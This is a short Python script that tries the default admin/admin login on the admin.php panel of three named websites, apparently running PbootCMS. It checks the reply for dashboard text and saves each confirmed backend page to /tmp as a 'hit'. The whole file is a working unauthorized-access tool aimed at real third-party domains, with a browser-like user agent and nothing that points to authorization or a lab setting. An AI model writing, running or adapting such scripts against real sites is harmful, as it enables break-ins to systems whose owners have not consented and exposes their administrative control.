#!/usr/bin/env python3
"""verify PbootCMS admin/admin hits - login + backend access"""
import urllib.request, urllib.parse, re, http.cookiejar

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}
SITES = ["http://indexsummit6.com", "http://insightsmonitor.com", "http://mendilab.com"]

def get_opener():
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj)), cj

def fetch(op, url, timeout=10, data=None, referer=None):
    h = {**UA}
    if data: h["Content-Type"] = "application/x-www-form-urlencoded"
    if referer: h["Referer"] = referer
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None, headers=h)
        r = op.open(req, timeout=timeout)
        return r.status, r.geturl(), r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, url, e.read(5000).decode("utf-8", "ignore")
    except Exception as ex:
        return 0, url, str(ex)

for site in SITES:
    print("=== %s ===" % site, flush=True)
    op, cj = get_opener()
    code, final, body = fetch(op, site + "/admin.php")
    print("  admin.php: %s size=%d" % (code, len(body)), flush=True)
    if "退出" in body or "logout" in body.lower():
        print("  ALREADY LOGGED IN?", flush=True)
        continue
    # login
    data = urllib.parse.urlencode({"user": "admin", "password": "admin", "code": ""})
    code, final, body = fetch(op, site + "/admin.php", data=data, referer=site + "/admin.php")
    # after login - check backend content
    has_dash = "退出" in body or "logout" in body.lower() or "后台" in body or "index/index" in body or "系统设置" in body
    title = re.search(r"<title>([^<]*)</title>", body, re.I)
    print("  login: %s size=%d dash=%s title=%s" % (code, len(body), has_dash, title.group(1)[:30] if title else "?"), flush=True)
    if has_dash:
        open("/tmp/pb_hit_%s.html" % site.replace("http://", "").replace(".", "_"), "w").write(body)
        print("  !!! CONFIRMED admin/admin", flush=True)
    else:
        # check response for login failure marker
        print("  resp:", body[:150].replace("\n", " "), flush=True)
